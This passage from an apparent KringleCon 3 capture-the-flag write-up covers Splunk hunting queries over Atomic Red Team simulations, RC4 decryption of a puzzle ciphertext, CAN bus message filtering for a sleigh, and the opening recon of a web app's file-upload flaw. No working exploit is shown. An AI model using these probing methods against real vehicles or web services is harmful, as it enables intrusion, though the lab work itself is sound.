    <img data-src="/images/kringlecon3/objectives/obj6_09.webp" alt="hint Q4" data-caption="hint Q4" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      hint Q4
      
        
        
      
    </figcaption>
  
</figure>
<p><em>Splunk Attack Range</em> keeps the details of the simulation in the attack index. We just need to search for the <em>OSTAP</em> keyword and take the oldest one. <em>OSTAP</em> is a family of <em>JS</em> malware used in certain attack campaigns as a downloader. We search for:</p>
<div class="box">index=attack ostap</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_08.webp" alt="index=attack ostap" data-caption="index=attack ostap" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      index=attack ostap
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> 2020–11–30T17:44:15Z</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q5. One <em>Atomic Red Team</em> test executed by the <em>Attack Range</em> makes use of an open source package authored by <strong>frgnca</strong> on <em>GitHub</em>. According to <em>Sysmon</em> (<em>Event Code 1</em>) events in <em>Splunk</em>, what was the <code>ProcessId</code> associated with the first use of this component?</div>
<p>If we have a look at <a href="https://github.com/frgnca/">frgnca Github</a> repository, we see a project called <code>AudioDeviceCmdlets</code>. We saw that the <a href="https://attack.mitre.org/techniques/T1123/">Audio Capture</a> (<em>T1123</em>) technique was used as part of the simulation. If we have a look at this technique in <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md">Atomic Red Team</a> repo, we see only 1 atomic test that uses a very specific commandlet:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_10.webp" alt="T1123 atomic test" data-caption="T1123 atomic test" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      T1123 atomic test
      
        
        
      
    </figcaption>
  
</figure>
<p>We can filter the logs with:</p>
<div class="box">index=t1123* WindowsAudioDevice-Powershell-Cmdlet EventCode=1</div>
<p>We get only 2 logs and the first one has a <code>ProcessId</code> of <code>3648</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_11.webp" alt="index=t1123* WindowsAudioDevice-Powershell-Cmdlet EventCode=1" data-caption="index=t1123* WindowsAudioDevice-Powershell-Cmdlet EventCode=1" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      index=t1123* WindowsAudioDevice-Powershell-Cmdlet EventCode=1
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> 3648</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6. <strong>Alice</strong> ran a simulation of an attacker abusing <em>Windows</em> registry run keys. This technique leveraged a multi-line batch file that was also used by a few other techniques. What is the final command of this multi-line batch file used as part of this simulation?</div>
<p><em>Registry Run Keys</em> are used in the technique <em>T1547.001</em> and can be used to achieve persistence. We find the usage of a batch file in the <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-3---powershell-registry-runonce">3rd Atomic test of T1547.001</a>. The batch file can be found <a href="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat">here</a>.</p>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> quser</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7. According to <em>x509</em> certificate events captured by <em>Zeek</em> (formerly <em>Bro</em>), what is the serial number of the <em>TLS</em> certificate assigned to the <em>Windows</em> domain controller in the attack range?</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_12.webp" alt="hint Q7" data-caption="hint Q7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      hint Q7
      
        
        
      
    </figcaption>
  
</figure>
<p><a href="https://zeek.org/">Zeek</a> is an open-source network analysis framework that we have seen in <a href="https://medium.com/@noobintheshell/kringlecon2-writeup-119b929790a6">KringleCon 2</a>. If we start with <strong>Alice</strong>&rsquo;s search filter, we see that certificate serials and subjects are indexed fields. If we look at the existing subjects, we see that the top 1 is the <em>Domain Controller</em> we are looking for. We click on it to drill-down:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_13.webp" alt="certificate Subjects" data-caption="certificate Subjects" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      certificate Subjects
      
        
        
      
    </figcaption>
  
</figure>
<p>From the very first log we can get its certificate serial number:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_14.webp" alt="DC certificate serial number" data-caption="DC certificate serial number" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      DC certificate serial number
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-success" role="alert" data-dir="ltr"><strong>Answer:</strong> 55FCEEBB21270D9249E86F4B9DC7AA60</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Objective Question: What is the name of the adversary group that <strong>Santa</strong> feared would attack <em>KringleCon</em>?</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_15.webp" alt="hint challenge question" data-caption="hint challenge question" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      hint challenge question
      
        
        
      
    </figcaption>
  
</figure>
<p>This one does not seem related to <em>Splunk</em>. We need to decrypt <strong>Alice</strong>&rsquo;s ciphertext. What we know from the hints is:</p>
<ul>
<li>the ciphertext is encoded in <em>Base64</em> to be &ldquo;readable&rdquo;,</li>
<li>the algorithm used may be <em>RC4</em> (<a href="https://tools.ietf.org/html/rfc7465">RFC 7465</a>),</li>
<li>the key can be found in <em>KringleCon 3</em> <a href="https://www.youtube.com/watch?v=RxVgEFt08kU">Splunk&rsquo;s talk</a> and is <strong>Santa</strong>&rsquo;s fav phrase.</li>
</ul>
<p>We get the encryption key at the very end of the <em>Splunk</em>&rsquo;s talk:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_16.webp" alt="key - Santa&#39;s fav phrase" data-caption="key - Santa&#39;s fav phrase" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      key - Santa&#39;s fav phrase
      
        
        
      
    </figcaption>
  
</figure>
<p>We can use the <a href="https://gchq.github.io/CyberChef/">CyberChef</a> toolkit to decrypt the ciphertext as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj6_17.webp" alt="CyberChef" data-caption="CyberChef" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CyberChef
      
        
        
      
    </figcaption>
  
</figure>
<div class="notices success" data-title="Objective 6 answer">
  The Lollipop Guild
</div>
<p>We unlock the <em>Narrative</em> 4 of 7:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/narrative/narrative04.webp" alt="narrative 4 of 7" data-caption="narrative 4 of 7" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      narrative 4 of 7
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="7---solve-the-sleighs-can-d-bus-problem">7 - Solve the Sleigh&rsquo;s CAN-D-BUS Problem</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj07_01.webp" alt="Objective 7 description" data-caption="Objective 7 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 7 description
      
        
        
      
    </figcaption>
  
</figure>
<p><strong>Santa</strong>&rsquo;s sleigh is located on the <em>Roof</em> and only <strong>Santa</strong> can access it. So let&rsquo;s transform again:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj07_02.webp" alt="Objective 7 location" data-caption="Objective 7 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 7 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Wunorse Openslae:</strong><br />
Hey <strong>Santa</strong>! Those tweaks you made to the sled just don&rsquo;t seem right to me. I can&rsquo;t figure out what&rsquo;s wrong, but maybe you can check it out to fix it.</div>
<p>We access the <em>CAN-D Bus</em> of the sleigh and see that messages are overflowing even when the sleigh is not in use. When can <code>START</code> the sleigh and see the counter increase:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj07_03.gif" alt="CAN-D Bus" data-caption="CAN-D Bus" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CAN-D Bus
      
        
        
      
    </figcaption>
  
</figure>
<p>The goal is to filter out all the bad messages and only keep the valid ones triggered by the buttons and sliders we have on the left side. Let&rsquo;s first block all the messages that are flowing with the following criteria:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj07_04.webp" alt="block all messages" data-caption="block all messages" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      block all messages
      
        
        
      
    </figcaption>
  
</figure>
<p>Clicking the <code>START</code> button triggers the message <code>02A#00FF00</code> but the sleigh does not accelerate. The <code>STOP</code> button triggers <code>02A#0000FF</code>. Like in the <a href="#5---can-bus-investigation">CAN-Bus Investigation</a> challenge, the <code>LOCK</code> and <code>UNLOCK</code> button triggers respectively <code>19B#000000000000</code> and <code>19B#0000F0000000</code>. Moving the <code>Accelerator</code>, <code>Brake</code> and <code>Steering</code> sliders do not seem to work. This means that they are probably using one of the <em>ID</em> we blocked.</p>
<p>After a few tries, we see that the sleigh speed generates the <code>244</code> <em>ID</em>. As soon as we remove the blocking rule, we can again start properly and accelerate. Let&rsquo;s block only the noisy message <code>244#0000000000</code> instead. What we discover is that the message <code>244</code> data is the speed in hexadecimal. For instance, <code>244#00000003E8</code> indicates that the sleigh moves at 1000 <em>RPM</em> (<em>Reindeer Per Minute</em>).</p>
<p>The <code>Stearing</code> uses the message <em>ID</em> <code>019</code> and does not seem to be flooded so we do not need to filter this message at all.</p>
<p>The <code>Brake</code> uses the <code>080</code> message <em>ID</em>. Again, we can block the noisy value <code>080#000000</code>. However, when we start breaking, we see that 2 messages are sent each second. The valid one has the <code>Break</code> value as data in hexadecimal. The malicious ones have a data value lower than zero.</p>
<p>This was not sufficient to make the sleigh work properly again. In the end, after a few other tries, we saw that all the data with zeros were legitimate. We are left with the doors and brake issues to solve. The necessary rules to exclude are:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj07_05.webp" alt="exclusion rules" data-caption="exclusion rules" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      exclusion rules
      
        
        
      
    </figcaption>
  
</figure>
<h3 id="8---broken-tag-generator">8 - Broken Tag Generator</h3>
<hr />
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_01.webp" alt="Objective 8 description" data-caption="Objective 8 description" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 8 description
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Noel Boetie:</strong><br />
I&rsquo;m <strong>Noel Boetie</strong>. Welcome to the <em>Wrapping Room</em>!</p>
<p>We wrap presents and tag them for delivery here. Unfortunately, the tag generator is acting up. I&rsquo;m hoping <strong>Santa</strong> can give me a hand nailing down that flaw.</p>
</div>
<p>Again, only <strong>Santa</strong> can access this terminal and if we come back as him, <strong>Noel</strong> says:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Noel Boetie:</strong><br />
Welcome to the <em>Wrapping Room</em>, <strong>Santa</strong>! The tag generator is acting up. I feel like the issue has something to do with weird files being uploaded.</p>
<p>Can you help me figure out what&rsquo;s wrong?</p>
</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_02.webp" alt="Objective 8 location" data-caption="Objective 8 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Objective 8 location
      
        
        
      
    </figcaption>
  
</figure>
<p>We access a <a href="https://tag-generator.kringlecastle.com/">webapp</a> that we can use to generate tags. We can play with the app and try all the features while going through a proxy like <a href="https://portswigger.net/burp">Burp</a> to analyze each call.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_06.webp" alt="https://tag-generator.kringlecastle.com" data-caption="https://tag-generator.kringlecastle.com" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      https://tag-generator.kringlecastle.com
      
        
        
      
    </figcaption>
  
</figure>
<p>Most of the tag creation is done client-side as well as the <code>Save Tag</code> feature used to download our tag. The client-side app logic is in <code>/js/app.js</code>. The only feature that calls a server endpoint is the upload function. It calls the <code>upload</code> endpoint as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj08_08.webp" alt="upload endpoint" data-caption="upload endpoint" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      upload endpoint
      
        
        
      
    </figcaption>
  
</figure>
<p>We get the new name of our image as a <em>JSON</em> object in the response:</p>
<div class="box">[&ldquo;09fef071-b2d4-4051-8854-f779176d8739.png&rdquo;]</div>
<p>By doing some tests with the image file we quickly see that we can upload any kind of content as long as the filename ends with <code>png</code> or <code>jpg</code>. If we upload a file with another extension we get the following error:</p>
<figure >
  
  
  
